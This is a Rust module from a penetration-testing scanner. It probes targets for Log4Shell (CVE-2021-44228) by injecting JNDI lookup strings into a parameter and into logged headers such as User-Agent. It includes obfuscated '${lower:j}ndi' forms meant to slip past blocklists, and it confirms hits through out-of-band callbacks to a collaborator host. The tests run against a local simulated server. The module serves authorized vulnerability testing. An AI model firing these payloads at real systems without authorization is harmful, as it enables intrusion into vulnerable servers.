//! log4shell — Log4Shell / JNDI lookup injection probes (CVE-2021-44228
//! class, CWE-917).
//!
//! Plants JNDI lookup strings (`${jndi:ldap://…}`) — including the
//! `${lower:j}ndi…` obfuscations that defeat naive `jndi:` blocklists —
//! into the target parameter (when present) and the headers most commonly
//! logged (User-Agent, X-Api-Version, Referer, X-Forwarded-For,
//! Accept-Language). Nothing in a payload executes on a patched or
//! non-Java target; on a vulnerable one the marker's JNDI lookup fires
//! once, contacting our listener, which is the confirmation.
//!
//! Two evidence paths:
//! 1. **OOB (confirmed)** — when `opts.collaborator` is set, payloads
//!    point at it and the check polls for the callback, like `blind_oob`.
//! 2. **Error signatures (tentative)** — without a collaborator, a
//!    vulnerable target may surface a JNDI/log4j error in the response;
//!    that alone is only a tentative Medium.

use crate::opts::Opts;
use crate::registry::CheckFuture;
use pentest_core::{Finding, HttpClient, HttpRequest, Severity};
use rand::RngCore;
use std::time::Duration;

pub const NAME: &str = "log4shell";

const POLL_TIMEOUT: Duration = Duration::from_secs(6);
const POLL_INTERVAL: Duration = Duration::from_secs(1);

const LOGGED_HEADERS: &[&str] = &[
    "X-Api-Version",
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "Accept-Language",
];

const ERROR_SIGNATURES: &[&str] = &[
    "jndi",
    "JndiLookup",
    "log4j",
    "org.apache.logging",
    "LoggerContext",
];

fn random_token() -> String {
    let mut bytes = [0u8; 6];
    rand::rng().fill_bytes(&mut bytes);
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

/// The three lookup forms sent per injection point: plain, lower-case
/// obfuscated, and default-lookup. Exposed for testing.
pub fn payloads(endpoint: &str) -> Vec<String> {
    vec![
        format!("${{jndi:ldap://{endpoint}}}"),
        format!("${{${{lower:j}}ndi:${{lower:l}}dap://{endpoint}}}"),
        format!("${{jndi:{endpoint}}}"),
    ]
}

/// Pure decision function, exposed for testing: an OOB hit is a confirmed
/// critical; a JNDI/log4j error signature in a response is tentative.
pub fn findings_from_evidence(oob_hit: bool, error_sig: Option<&str>) -> Vec<Finding> {
    let mut out = Vec::new();
    if oob_hit {
        out.push(
            Finding::new(
                NAME,
                Severity::Critical,
                "JNDI lookup callback received (Log4Shell)",
                "target resolved a planted ${jndi:…} lookup and contacted the collaborator — log4j2 < 2.15 behavior",
            )
            .with_evidence("OOB JNDI callback"),
        );
    } else if let Some(sig) = error_sig {
        out.push(
            Finding::new(
                NAME,
                Severity::Medium,
                "JNDI/log4j error signature in response",
                format!("response leaked '{sig}' while a ${{jndi:…}} lookup was being processed — tentative; verify the runtime is log4j2 < 2.15"),
            )
            .with_evidence(sig.to_string()),
        );
    }
    out
}

pub fn run<'a>(client: &'a HttpClient, opts: &'a Opts) -> CheckFuture<'a> {
    Box::pin(run_impl(client, opts, POLL_TIMEOUT, POLL_INTERVAL))
}

async fn run_impl(
    client: &HttpClient,
    opts: &Opts,
    poll_timeout: Duration,
    poll_interval: Duration,
) -> Vec<Finding> {
    let method = opts.method.to_uppercase();
    let mut saw_error_sig: Option<String> = None;

    // Endpoint for JNDI lookups: the collaborator when provided (giving
    // the confirmed-OOB path), otherwise a RFC 6761 TEST host — the
    // lookup still fires inside the target (surfacing error signatures)
    // but cannot call out to anyone.
    let token = random_token();
    let (endpoint_base, collab) = match &opts.collaborator {
        Some(c) => {
            let url = reqwest::Url::parse(c).ok();
            // host[:port] — the JNDI lookup must reach the actual
            // listener, so an explicit non-default port is kept.
            let host = url
                .as_ref()
                .and_then(|u| u.host_str().map(|h| h.to_string()))
                .unwrap_or_else(|| c.trim_start_matches("http://").to_string());
            let host = match url.as_ref().and_then(|u| u.port()) {
                Some(p) => format!("{host}:{p}"),
                None => host,
            };
            (format!("{host}/{token}"), Some(c.clone()))
        }
        None => (format!("{token}.invalid"), None),
    };
    let endpoints: Vec<String> = if collab.is_some() {
        vec![
            format!("{endpoint_base}/plain"),
            format!("{endpoint_base}/obf"),
        ]
    } else {
        vec![endpoint_base]
    };

    for ep in &endpoints {
        for payload in payloads(ep) {
            // Parameter injection (when a param is fuzzed).
            if let Some(param) = &opts.param {
                let req = if method == "POST" {
                    HttpRequest::post().form_field(param, &payload)
                } else {
                    HttpRequest::get().param(param, &payload)
                };
                if let Ok(r) = client.request(req).await {
                    saw_error_sig = saw_error_sig.or_else(|| error_signature(&r.body));
                }
            }
            // Header injection into commonly-logged sinks.
            for h in LOGGED_HEADERS {
                if let Ok(r) = client
                    .request(HttpRequest::get().header(*h, &payload))
                    .await
                {
                    saw_error_sig = saw_error_sig.or_else(|| error_signature(&r.body));
                }
            }
        }
    }

    let oob_hit = if let Some(c) = &collab {
        !pentest_collaborator::get_hits(c, &token)
            .await
            .unwrap_or_default()
            .is_empty()
            || poll(c, &token, poll_timeout, poll_interval).await
    } else {
        false
    };

    findings_from_evidence(oob_hit, saw_error_sig.as_deref())
}

fn error_signature(body: &str) -> Option<String> {
    ERROR_SIGNATURES
        .iter()
        .find(|s| body.contains(*s))
        .map(|s| s.to_string())
}

async fn poll(collab: &str, token: &str, timeout: Duration, interval: Duration) -> bool {
    let deadline = std::time::Instant::now() + timeout;
    loop {
        if let Ok(hits) = pentest_collaborator::get_hits(collab, token).await {
            if !hits.is_empty() {
                return true;
            }
        }
        if std::time::Instant::now() >= deadline {
            return false;
        }
        tokio::time::sleep(interval).await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::test_support::{scripted_server, ScriptedResponse};
    use pentest_collaborator::{bind, Collaborator};
    use pentest_core::HttpClientConfig;
    use std::sync::Arc;

    fn fast_client(base_url: String) -> HttpClient {
        HttpClient::new(
            base_url,
            HttpClientConfig {
                delay: std::time::Duration::from_millis(0),
                ..HttpClientConfig::default()
            },
        )
    }

    async fn spawn_collaborator() -> String {
        let (listener, addr) = bind("127.0.0.1", 0).await.unwrap();
        let collab = Arc::new(Collaborator::new());
        tokio::spawn(collab.serve(listener));
        format!("http://{addr}")
    }

    #[test]
    fn payloads_cover_plain_obfuscated_and_default_forms() {
        let ps = payloads("h.test/abc");
        assert_eq!(ps.len(), 3);
        assert_eq!(ps[0], "${jndi:ldap://h.test/abc}");
        assert_eq!(ps[1], "${${lower:j}ndi:${lower:l}dap://h.test/abc}");
        assert_eq!(ps[2], "${jndi:h.test/abc}");
    }

    #[test]
    fn decision_prefers_oob_and_downgrades_error_signatures() {
        let confirmed = findings_from_evidence(true, Some("jndi"));
        assert_eq!(confirmed[0].severity, Severity::Critical);

        let tentative = findings_from_evidence(false, Some("JndiLookup"));
        assert_eq!(tentative[0].severity, Severity::Medium);
        assert_eq!(tentative[0].evidence, "JndiLookup");

        assert!(findings_from_evidence(false, None).is_empty());
    }

    #[tokio::test]
    async fn flags_a_jndi_error_signature_without_a_collaborator() {
        let base = scripted_server(|req, _| {
            let ua = req
                .headers
                .iter()
                .find(|(k, _)| k.eq_ignore_ascii_case("X-Api-Version"))
                .map(|(_, v)| v.clone())
                .unwrap_or_default();
            if ua.contains("${") {
                ScriptedResponse::ok("error: JndiLookup disabled by admin? no: exception in log4j")
            } else {
                ScriptedResponse::ok("ok")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts::default();

        let findings = run_impl(&client, &opts, POLL_TIMEOUT, POLL_INTERVAL).await;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Medium);
        assert!(!findings[0].evidence.is_empty());
    }

    #[tokio::test]
    async fn confirms_via_collaborator_when_the_target_calls_back() {
        let collab = spawn_collaborator().await;
        // A "vulnerable" target: it resolves the planted JNDI endpoint
        // like a real JNDI provider would — extracting "host/rest-of-url"
        // out of the lookup string (handling plain `ldap://`,
        // obfuscated `${lower:l}dap://`, and bare `jndi:` forms) and
        // GETting that endpoint. The collaborator buckets the hit under
        // the first path segment, which is the run token.
        let base = scripted_server(move |req, _| {
            let ua = req
                .headers
                .iter()
                .find(|(k, _)| k.eq_ignore_ascii_case("X-Api-Version"))
                .map(|(_, v)| v.clone())
                .unwrap_or_default();
            let endpoint = if let Some(i) = ua.find("dap://") {
                ua[i + 6..].trim_end_matches('}').to_string()
            } else if let Some(i) = ua.find("jndi:") {
                ua[i + 5..].trim_end_matches('}').to_string()
            } else {
                String::new()
            };
            if let Some((host, path)) = endpoint.split_once('/') {
                if !host.is_empty() && !path.is_empty() {
                    let url = format!("http://{host}/{path}");
                    std::thread::spawn(move || {
                        let _ = simulate_jndi_callback(&url);
                    });
                }
            }
            ScriptedResponse::ok("ok")
        })
        .await;
        let client = fast_client(base);
        let opts = Opts {
            collaborator: Some(collab.clone()),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts, POLL_TIMEOUT, POLL_INTERVAL).await;

        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::Critical && f.evidence.contains("OOB")),
            "a JNDI callback must be confirmed, got {findings:?}"
        );
    }

    /// Blocking one-shot GET used by the fake "vulnerable" target above
    /// (std::thread can't await). Any HTTP failure is fine — the
    /// collaborator may not get the hit and the test would fail on the
    /// missing finding, which is the honest signal.
    fn simulate_jndi_callback(url: &str) -> std::io::Result<()> {
        use std::io::{Read, Write};
        let rest = url.trim_start_matches("http://");
        let (authority, path) = rest.split_once('/').unwrap_or((rest, ""));
        let mut stream = std::net::TcpStream::connect(authority)?;
        stream.write_all(
            format!("GET /{path} HTTP/1.1\r\nHost: {authority}\r\nConnection: close\r\n\r\n")
                .as_bytes(),
        )?;
        let mut buf = String::new();
        stream.read_to_string(&mut buf)?;
        Ok(())
    }

    #[tokio::test]
    async fn quiet_on_a_clean_target_without_collaborator() {
        let base = scripted_server(|_req, _| ScriptedResponse::ok("ok")).await;
        let client = fast_client(base);

        let findings = run_impl(&client, &Opts::default(), POLL_TIMEOUT, POLL_INTERVAL).await;

        assert!(findings.is_empty(), "got {findings:?}");
    }
}
